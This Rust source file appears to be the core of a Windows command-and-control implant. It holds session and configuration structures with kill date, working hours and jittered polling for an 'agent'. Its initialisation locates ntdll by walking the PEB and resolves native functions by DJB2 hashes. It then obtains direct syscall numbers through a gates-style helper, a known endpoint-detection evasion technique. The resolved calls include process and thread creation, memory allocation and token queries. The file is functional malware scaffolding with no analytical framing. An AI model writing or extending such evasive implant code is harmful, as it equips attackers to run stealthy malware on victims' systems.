#![no_std]

pub mod ldr;

extern crate alloc;

use alloc::{string::String, vec::Vec};
use core::ffi::c_void;
use core::sync::atomic::{AtomicBool, Ordering};
use core::{cell::UnsafeCell, ptr::null_mut};
use ldr::{ldr_function_addr, ldr_module_peb, nt_current_teb};
use mod_hhtgates::get_syscall_number;
use spin::Mutex;

use rs2_win32::ntapi::NtDll;
use rs2_win32::ntdef::{KUserSharedData, TEB};

/// Represents a session containing connection information.
pub struct Session {
    /// Indicates if the session is connected.
    pub connected: bool,
    /// Unique identifier for the session.
    pub id: String,
    /// Process ID.
    pub pid: i64,
    /// Parent Process ID.
    pub ppid: i64,
    /// Thread ID.
    pub tid: i64,
    /// Encryptor
    pub encryptor_ptr: *mut c_void,
    /// Protocol
    pub protocol_ptr: *mut c_void,
}

impl Session {
    /// Creates a new, disconnected session with default values.
    pub fn new() -> Self {
        Session {
            connected: false,
            id: String::new(),
            pid: 0,
            ppid: 0,
            tid: 0,
            encryptor_ptr: null_mut(),
            protocol_ptr: null_mut(),
        }
    }

    /// Set the generic pointer to data.
    pub fn set_encryptor_ptr(&mut self, encryptor: *mut c_void) {
        self.encryptor_ptr = encryptor;
    }

    /// Set the generic pointer to data.
    pub fn set_protocol_ptr(&mut self, protocol: *mut c_void) {
        self.protocol_ptr = protocol;
    }
}

/// Configuration settings for the instance.
pub struct Config {
    /// The unique identifier of the agent, required to poll for tasks
    pub id: String,
    /// The unix timestamp of the kill date, if any.
    pub kill_date: Option<i64>,
    /// The working hours for the current day (unix timestamp), if any.
    pub working_hours: Option<Vec<Option<i64>>>,
    /// The agent polling interval in milliseconds.
    pub polling_interval: i64,
    /// The agent polling jitter in milliseconds.
    pub polling_jitter: i64,
}

impl Config {
    /// Creates a new configuration with default values.
    pub fn new() -> Self {
        Config {
            id: String::new(),
            kill_date: None,
            polling_interval: 0,
            polling_jitter: 0,
            working_hours: None,
        }
    }
}

/// Represents the global instance containing configuration and session information.
pub struct Instance {
    /// Pointer to the Thread Environment Block.
    pub teb: *mut TEB,
    /// Kernel User Shared Data.
    pub kdata: *mut KUserSharedData,
    /// NtDll instance for native API calls.
    pub ntdll: NtDll,
    /// Session information.
    pub session: Session,
    /// Configuration settings.
    pub config: Config,
    /// Pointer to Checkin Data
    pub pcheckindata: *mut c_void,
}

impl Instance {
    /// Creates a new instance with default values.
    pub fn new() -> Self {
        Instance {
            teb: null_mut(),
            kdata: null_mut(),
            ntdll: NtDll::new(),
            session: Session::new(),
            config: Config::new(),
            pcheckindata: null_mut(),
        }
    }

    /// Set the generic pointer to data.
    pub fn set_checkin_data(&mut self, data: *mut c_void) {
        self.pcheckindata = data;
    }
}

// Atomic flag to ensure initialization happens only once.
static INIT_INSTANCE: AtomicBool = AtomicBool::new(false);

/// Global mutable instance of the agent.
pub static mut INSTANCE: Mutex<UnsafeCell<Option<Instance>>> = Mutex::new(UnsafeCell::new(None));

/// Retrieves a reference to the global instance of the agent.
///
/// # Safety
///
/// This function is unsafe because it involves mutable static data.
/// The caller must ensure no data races occur when accessing the global instance.
pub unsafe fn instance() -> &'static Instance {
    ensure_initialized();
    return INSTANCE.lock().get().as_ref().unwrap().as_ref().unwrap();
}

/// Retrieves a mutable reference to the global instance of the agent.
///
/// # Safety
///
/// This function is unsafe because it involves mutable static data.
/// The caller must ensure no data races occur when accessing the global instance.
pub unsafe fn instance_mut() -> &'static mut Instance {
    ensure_initialized();
    INSTANCE.lock().get().as_mut().unwrap().as_mut().unwrap()
}

/// Function to ensure that initialization is performed if it hasn't been already.
fn ensure_initialized() {
    unsafe {
        // Check and call initialize if not already done.
        if !INIT_INSTANCE.load(Ordering::Acquire) {
            init_global_instance();
        }
    }
}

/// Initializes the global instance by setting up necessary system call addresses and session data.
unsafe fn init_global_instance() {
    // Check if initialization has already occurred.
    if !INIT_INSTANCE.load(Ordering::Acquire) {
        // Hashes and function addresses for various NTDLL functions
        const NTDLL_HASH: u32 = 0x1edab0ed;

        pub const LDR_LOAD_DLL_DBJ2: usize = 0x9e456a43;
        pub const RTLCREATEPROCESSPARAMETERSEX_DBJ2: usize = 0x533a05db;
        const NT_ALLOCATE_VIRTUAL_MEMORY: usize = 0xf783b8ec;
        const NT_FREE_VIRTUAL_MEMORY: usize = 0x2802c609;

        const NT_TERMINATE_THREAD: usize = 0xccf58808;
        const NT_TERMINATE_PROCESS: usize = 0x4ed9dd4f;

        const NT_CLOSE: usize = 0x40d6e69d;
        const NT_OPEN_KEY: usize = 0x7682ed42;
        const NT_QUERY_VALUE_KEY: usize = 0x85967123;
        const NT_ENUMERATE_KEY: usize = 0x4d8a8976;
        const NT_QUERY_INFORMATION_PROCESS: usize = 0x8cdc5dc2;
        const NT_QUERY_INFORMATION_TOKEN: usize = 0xf371fe4;
        const NT_OPEN_PROCESS_TOKEN_TOKEN: usize = 0x350dca99;
        const NT_DELAY_EXECUTION_TOKEN: usize = 0xf5a936aa;

        const NT_CREATE_THREAD_EX_TOKEN: usize = 0xaf18cfb0;
        const NT_WAIT_FOR_SINGLE_OBJECT_TOKEN: usize = 0xe8ac0c3c;
        const NT_OPEN_PROCESS_TOKEN: usize = 0x4b82f718;
        const NT_CREATE_USER_PROCESS_TOKEN: usize = 0x54ce5f79;

        let mut instance = Instance::new();

        instance.kdata = 0x7FFE0000 as *mut KUserSharedData;
        instance.teb = nt_current_teb();

        // Resolve NTDLL functions
        instance.ntdll.module_base = ldr_module_peb(NTDLL_HASH);

        // Resolve LdrLoadDll
        let ldr_load_dll_addr = ldr_function_addr(instance.ntdll.module_base, LDR_LOAD_DLL_DBJ2);
        instance.ntdll.ldr_load_dll = core::mem::transmute(ldr_load_dll_addr);

        // Resolve LdrLoadDll
        let rtl_create_process_parameters_ex_addr = ldr_function_addr(
            instance.ntdll.module_base,
            RTLCREATEPROCESSPARAMETERSEX_DBJ2,
        );
        instance.ntdll.rtl_create_process_parameters_ex =
            core::mem::transmute(rtl_create_process_parameters_ex_addr);

        // NtAllocateVirtualMemory
        instance.ntdll.nt_allocate_virtual_memory.syscall.address =
            ldr_function_addr(instance.ntdll.module_base, NT_ALLOCATE_VIRTUAL_MEMORY);
        instance.ntdll.nt_allocate_virtual_memory.syscall.number =
            get_syscall_number(instance.ntdll.nt_allocate_virtual_memory.syscall.address);

        // NtFreeVirtualMemory
        instance.ntdll.nt_free_virtual_memory.syscall.address =
            ldr_function_addr(instance.ntdll.module_base, NT_FREE_VIRTUAL_MEMORY);
        instance.ntdll.nt_free_virtual_memory.syscall.number =
            get_syscall_number(instance.ntdll.nt_free_virtual_memory.syscall.address);

        // NtTerminateThread
        instance.ntdll.nt_terminate_thread.syscall.address =
            ldr_function_addr(instance.ntdll.module_base, NT_TERMINATE_THREAD);
        instance.ntdll.nt_terminate_thread.syscall.number =
            get_syscall_number(instance.ntdll.nt_terminate_thread.syscall.address);

        // NtTerminateProcess
        instance.ntdll.nt_terminate_process.syscall.address =
            ldr_function_addr(instance.ntdll.module_base, NT_TERMINATE_PROCESS);
        instance.ntdll.nt_terminate_process.syscall.number =
            get_syscall_number(instance.ntdll.nt_terminate_process.syscall.address);

        // NtClose
        instance.ntdll.nt_close.syscall.address =
            ldr_function_addr(instance.ntdll.module_base, NT_CLOSE);
        instance.ntdll.nt_close.syscall.number =
            get_syscall_number(instance.ntdll.nt_close.syscall.address);

        // NtOpenKey
        instance.ntdll.nt_open_key.syscall.address =
            ldr_function_addr(instance.ntdll.module_base, NT_OPEN_KEY);
        instance.ntdll.nt_open_key.syscall.number =
            get_syscall_number(instance.ntdll.nt_open_key.syscall.address);

        // NtQueryValueKey
        instance.ntdll.nt_query_value_key.syscall.address =
            ldr_function_addr(instance.ntdll.module_base, NT_QUERY_VALUE_KEY);
        instance.ntdll.nt_query_value_key.syscall.number =
            get_syscall_number(instance.ntdll.nt_query_value_key.syscall.address);

        // NtEnumerateKey
        instance.ntdll.nt_enumerate_key.syscall.address =
            ldr_function_addr(instance.ntdll.module_base, NT_ENUMERATE_KEY);
        instance.ntdll.nt_enumerate_key.syscall.number =
            get_syscall_number(instance.ntdll.nt_enumerate_key.syscall.address);

        // NtQueryInformationProccess
        instance.ntdll.nt_query_information_process.syscall.address =
            ldr_function_addr(instance.ntdll.module_base, NT_QUERY_INFORMATION_PROCESS);
        instance.ntdll.nt_query_information_process.syscall.number =
            get_syscall_number(instance.ntdll.nt_query_information_process.syscall.address);

        // NtOpenProcess
        instance.ntdll.nt_open_process.syscall.address =
            ldr_function_addr(instance.ntdll.module_base, NT_OPEN_PROCESS_TOKEN);
        instance.ntdll.nt_open_process.syscall.number =
            get_syscall_number(instance.ntdll.nt_open_process.syscall.address);

        // NtOpenProcessToken
        instance.ntdll.nt_open_process_token.syscall.address =
            ldr_function_addr(instance.ntdll.module_base, NT_OPEN_PROCESS_TOKEN_TOKEN);
        instance.ntdll.nt_open_process_token.syscall.number =
            get_syscall_number(instance.ntdll.nt_open_process_token.syscall.address);

        // NtQueryInformationToken
        instance.ntdll.nt_query_information_token.syscall.address =
            ldr_function_addr(instance.ntdll.module_base, NT_QUERY_INFORMATION_TOKEN);
        instance.ntdll.nt_query_information_token.syscall.number =
            get_syscall_number(instance.ntdll.nt_query_information_token.syscall.address);

        // NtDelayExecution
        instance.ntdll.nt_delay_execution.syscall.address =
            ldr_function_addr(instance.ntdll.module_base, NT_DELAY_EXECUTION_TOKEN);
        instance.ntdll.nt_delay_execution.syscall.number =
            get_syscall_number(instance.ntdll.nt_delay_execution.syscall.address);

        // NtCreateThreadEx
        instance.ntdll.nt_create_thread_ex.syscall.address =
            ldr_function_addr(instance.ntdll.module_base, NT_CREATE_THREAD_EX_TOKEN);
        instance.ntdll.nt_create_thread_ex.syscall.number =
            get_syscall_number(instance.ntdll.nt_create_thread_ex.syscall.address);

        // NtWaitForSingleObject
        instance.ntdll.nt_wait_for_single_object.syscall.address =
            ldr_function_addr(instance.ntdll.module_base, NT_WAIT_FOR_SINGLE_OBJECT_TOKEN);
        instance.ntdll.nt_wait_for_single_object.syscall.number =
            get_syscall_number(instance.ntdll.nt_wait_for_single_object.syscall.address);

        // NtCreateUserProcess
        instance.ntdll.nt_create_user_process.syscall.address =
            ldr_function_addr(instance.ntdll.module_base, NT_CREATE_USER_PROCESS_TOKEN);
        instance.ntdll.nt_create_user_process.syscall.number =
            get_syscall_number(instance.ntdll.nt_create_user_process.syscall.address);

        // Init Session Data
        instance.session.connected = false;
        instance.session.pid = instance.teb.as_ref().unwrap().client_id.unique_process as i64;
        instance.session.tid = instance.teb.as_ref().unwrap().client_id.unique_thread as i64;

        // Init Config Data
        instance.config.polling_interval = 15;
        instance.config.polling_jitter = 10;

        *INSTANCE.lock().get() = Some(instance);

        // Set the initialization flag to true.
        INIT_INSTANCE.store(true, Ordering::Release);
    }
}
